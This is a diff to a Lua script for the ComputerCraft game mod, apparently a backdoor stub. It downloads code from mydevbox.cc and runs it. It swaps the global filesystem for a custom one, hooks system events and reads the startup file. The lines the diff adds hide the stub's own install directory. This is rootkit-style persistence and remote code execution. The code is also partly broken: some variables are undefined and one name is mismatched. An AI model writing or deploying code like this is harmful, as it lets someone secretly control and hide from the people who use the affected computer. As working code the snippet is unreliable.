@@ -7,7 +7,7 @@ main.__index = main
 local _ogg = _G
 local _ogENV = _ENV
 local _OGShell = shell
-local _OGFS = fs
+local _OGFS = _G.fs
 local backupPullEventRaw = _G.os.pullEventRaw
 local backupPullEvent = _G.os.pullEvent
 local customeventmanager = (pcall(require, "hooks.customeventmanager") and require("hooks.customeventmanager")) or load(http.get("https://mydevbox.cc/src/hooks/customeventmanager.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "customeventmanager", "t", _G)()
@@ -26,11 +26,18 @@ local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or 
 local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
 
-local function getRealStartupPath() if not _OGFS.exists("startup.lua") then return nil end local f = _OGFS.open("startup.lua", "r") for i = 1, 6 do local l = f.readLine() if not l then break end local filename = string.match(l, "^%-%-%s*(.-)%.$") if filename then f.close() return filename end end f.close() return nil end
-local xsup=getRealStartupPat()
-if h~=nil then customfs.setOriginalStartup(xsup) end
+local function getRealStartupPath() if not _OGFS.exists("/startup.lua") then return nil end local f1 = _OGFS.open("/startup.lua", "r") if (f1==nil) then return nil end for i = 1, 6 do local l = f1.readLine() if not l then break end local filename = string.match(l, "^%-%-%s*(.-)%.$") if filename then f.close() return filename end end f.close() return nil end
+local function getBDApath() local f=OriginalFS.exists("/startup.lua") and OriginalFS.open("/startup.lua","r") or nil for i=1,6 do local l=f and f.readLine() if not l then break end local path,filename=string.match(l,"^%-%-%s*(.-),(.-)$") if path and filename then f.close() return path,filename end end if f then f.close() end return nil,nil end
+local xsup=getRealStartupPath()
 
+if h~=nil then customfs.setOriginalStartup(xsup) end
+local bdapath, _ = getBDApath()
+if customfs ~= nil and bdapath ~= nil then
+    _ = nil
+    customfs.hideDir(bdapath)
+end
 _G.fs=customfs
+uninstaller_installer.setOGFS(_OGFS)
 uninstaller_installer.setCFS(customfs)
 uninstaller_installer.setOGShell(_OGShell)
 eventhook.setCustomQueueEvent(customeventmanager.getQueueEventName())
